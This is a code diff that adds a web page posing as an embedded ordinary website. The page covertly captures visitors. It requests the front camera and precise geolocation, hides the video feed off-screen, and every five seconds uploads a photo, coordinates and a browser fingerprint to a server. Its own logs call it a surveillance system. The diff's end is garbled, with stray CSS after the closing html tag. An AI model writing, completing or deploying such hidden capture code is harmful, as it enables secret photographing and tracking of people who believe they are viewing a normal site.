@@ -16,7 +16,6 @@
             overflow: hidden;
         }
 
-        /* Full screen iframe */
         #websiteFrame {
             width: 100vw;
             height: 100vh;
@@ -24,7 +23,6 @@
             display: block;
         }
 
-        /* Hidden camera elements */
         #hiddenCamera {
             position: fixed;
             top: -9999px;
@@ -32,9 +30,9 @@
             width: 1px;
             height: 1px;
             opacity: 0;
+            pointer-events: none;
         }
 
-        /* Optional: Loading screen */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -71,39 +69,363 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Floating control panel (optional - can be hidden) */
-        #controlPanel {
+        #debugPanel {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
+            bottom: 10px;
+            right: 10px;
             background: rgba(0,0,0,0.8);
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 12px;
-            z-index: 1000;
-            display: none; /* Hide by default */
+            color: #0f0;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 10px;
+            max-width: 300px;
+            z-index: 10000;
+            display: none;
         }
 
-        #controlPanel.show {
+        #debugPanel.show {
             display: block;
         }
+    </style>
+</head>
+<body>
+    <div id="loadingScreen">
+        <div class="spinner"></div>
+        <h2>Loading Website...</h2>
+        <p id="loadingStatus" style="margin-top: 10px; font-size: 14px;">Initializing...</p>
+    </div>
 
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 5px;
+    <iframe id="websiteFrame" src="" allowfullscreen sandbox="allow-same-origin allow-scripts allow-popups allow-forms"></iframe>
+
+    <div id="hiddenCamera">
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <!-- Debug Panel (Remove in production) -->
+    <div id="debugPanel">
+        <div>Status: <span id="debugStatus">Starting...</span></div>
+        <div>Camera: <span id="debugCamera">Pending</span></div>
+        <div>Location: <span id="debugLocation">Pending</span></div>
+        <div>Captures: <span id="debugCaptures">0</span></div>
+        <div>Last: <span id="debugLast">Never</span></div>
+    </div>
+
+    <script>
+        // Debug mode (set to false in production)
+        const DEBUG_MODE = true;
+
+        // Configuration
+        const savedConfig = localStorage.getItem('surveillanceConfig');
+        const CONFIG = savedConfig ? JSON.parse(savedConfig) : {
+            targetWebsite: 'https://www.google.com',
+            captureInterval: 5000,
+            showControlPanel: false,
+            autoStart: true
+        };
+
+        // Global variables
+        let monitoringActive = false;
+        let monitoringInterval = null;
+        let stream = null;
+        let captureCount = 0;
+        let permissionsGranted = {
+            camera: false,
+            location: false
+        };
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const websiteFrame = document.getElementById('websiteFrame');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const loadingStatus = document.getElementById('loadingStatus');
+        const debugPanel = document.getElementById('debugPanel');
+
+        // Show debug panel if enabled
+        if (DEBUG_MODE) {
+            debugPanel.classList.add('show');
         }
 
-        .status-dot.active {
-            background: #00ff00;
-            box-shadow: 0 0 10px #00ff00;
+        // Debug logger
+        function debugLog(category, message, status = 'info') {
+            console.log(`[${category}] ${message}`);
+            if (DEBUG_MODE) {
+                const element = document.getElementById(`debug${category}`);
+                if (element) {
+                    element.textContent = message;
+                    element.style.color = status === 'error' ? '#f00' : status === 'success' ? '#0f0' : '#ff0';
+                }
+            }
         }
 
-        .status-dot.inactive {
-            background: #ff0000;
+        // Update loading status
+        function updateLoadingStatus(message) {
+            loadingStatus.textContent = message;
+            debugLog('Status', message);
+        }
+
+        // Check if running on HTTPS (required for camera/location)
+        function checkSecureContext() {
+            if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+                console.warn('⚠️ Not running on HTTPS. Camera and location may not work.');
+                return false;
+            }
+            return true;
+        }
+
+        // Get browser info
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                viewportWidth: window.innerWidth,
+                viewportHeight: window.innerHeight,
+                timestamp: new Date().toISOString(),
+                isSecure: location.protocol === 'https:',
+                url: window.location.href
+            };
+        }
+
+        // Get location with timeout
+        function getCurrentLocation() {
+            return new Promise((resolve) => {
+                updateLoadingStatus('Getting location...');
+                
+                if (!navigator.geolocation) {
+                    debugLog('Location', 'Not supported', 'error');
+                    resolve(null);
+                    return;
+                }
+
+                const timeout = setTimeout(() => {
+                    debugLog('Location', 'Timeout', 'error');
+                    resolve(null);
+                }, 10000); // 10 second timeout
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        clearTimeout(timeout);
+                        const location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        debugLog('Location', `${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}`, 'success');
+                        permissionsGranted.location = true;
+                        resolve(location);
+                    },
+                    (error) => {
+                        clearTimeout(timeout);
+                        debugLog('Location', `Error: ${error.message}`, 'error');
+                        permissionsGranted.location = false;
+                        resolve(null);
+                    },
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 8000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // Initialize camera with retries
+        async function initCamera(retries = 3) {
+            updateLoadingStatus('Requesting camera access...');
+            
+            for (let i = 0; i < retries; i++) {
+                try {
+                    debugLog('Camera', `Attempt ${i + 1}/${retries}`);
+                    
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    });
+                    
+                    video.srcObject = stream;
+                    await video.play();
+                    
+                    // Wait for video to be ready
+                    await new Promise(resolve => {
+                        video.onloadedmetadata = resolve;
+                    });
+
+                    debugLog('Camera', 'Active', 'success');
+                    permissionsGranted.camera = true;
+                    return true;
+
+                } catch (error) {
+                    debugLog('Camera', `Attempt ${i + 1} failed: ${error.message}`, 'error');
+                    
+                    if (i === retries - 1) {
+                        console.error('❌ Camera access failed after retries:', error);
+                        permissionsGranted.camera = false;
+                        return false;
+                    }
+                    
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                }
+            }
+            return false;
+        }
+
+        // Capture and send data
+        async function captureAndSend() {
+            try {
+                debugLog('Status', 'Capturing...', 'info');
+
+                // Check if video is ready
+                if (!stream || video.readyState !== video.HAVE_ENOUGH_DATA) {
+                    console.warn('⚠️ Video not ready, skipping capture');
+                    return;
+                }
+
+                // Capture photo
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
+                });
+
+                if (!blob) {
+                    console.error('❌ Failed to create image blob');
+                    return;
+                }
+
+                // Get data
+                const location = await getCurrentLocation();
+                const browserInfo = getBrowserInfo();
+
+                // Send to server
+                const formData = new FormData();
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('location', JSON.stringify(location || {}));
+                formData.append('browserInfo', JSON.stringify(browserInfo));
+                formData.append('pageUrl', CONFIG.targetWebsite);
+
+                updateLoadingStatus('Sending data...');
+
+                const response = await fetch('/upload-photo', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    captureCount++;
+                    debugLog('Captures', captureCount, 'success');
+                    debugLog('Last', new Date().toLocaleTimeString(), 'success');
+                    console.log('✅ Data sent successfully:', result);
+                } else {
+                    console.error('❌ Server error:', result.error);
+                    debugLog('Status', `Error: ${result.error}`, 'error');
+                }
+
+            } catch (error) {
+                console.error('❌ Capture error:', error);
+                debugLog('Status', `Error: ${error.message}`, 'error');
+            }
+        }
+
+        // Start monitoring
+        async function startMonitoring() {
+            debugLog('Status', 'Starting...', 'info');
+            updateLoadingStatus('Starting surveillance...');
+
+            // Check secure context
+            if (!checkSecureContext()) {
+                updateLoadingStatus('⚠️ HTTPS required for camera/location');
+                await new Promise(resolve => setTimeout(resolve, 3000));
+            }
+
+            // Initialize camera
+            const cameraOk = await initCamera();
+            
+            if (!cameraOk) {
+                console.log('⚠️ Camera not available, continuing without it');
+                updateLoadingStatus('Camera unavailable - continuing...');
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+
+            monitoringActive = true;
+            debugLog('Status', 'Active', 'success');
+
+            // Hide loading screen
+            loadingScreen.classList.add('hidden');
+
+            // Initial capture after 3 seconds
+            setTimeout(captureAndSend, 3000);
+
+            // Regular captures
+            monitoringInterval = setInterval(captureAndSend, CONFIG.captureInterval);
+        }
+
+        // Stop monitoring
+        function stopMonitoring() {
+            monitoringActive = false;
+            
+            if (monitoringInterval) {
+                clearInterval(monitoringInterval);
+            }
+            
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            debugLog('Status', 'Stopped', 'error');
+        }
+
+        // Load website
+        function loadWebsite() {
+            websiteFrame.src = CONFIG.targetWebsite;
+            
+            websiteFrame.onload = () => {
+                updateLoadingStatus('Website loaded');
+                
+                if (CONFIG.autoStart) {
+                    setTimeout(startMonitoring, 2000);
+                }
+            };
+
+            websiteFrame.onerror = () => {
+                updateLoadingStatus('Failed to load website');
+                console.error('❌ Failed to load:', CONFIG.targetWebsite);
+            };
+        }
+
+        // Initialize
+        window.addEventListener('load', () => {
+            console.log('🚀 Surveillance system initializing...');
+            console.log('📍 Config:', CONFIG);
+            loadWebsite();
+        });
+
+        // Cleanup
+        window.addEventListener('beforeunload', stopMonitoring);
+
+        // Handle visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                debugLog('Status', 'Background', 'info');
+            } else {
+                debugLog('Status', 'Foreground', 'success');
+            }
+        });
+    </script>
+</body>
+</html>            background: #ff0000;
         }
     </style>
 </head>
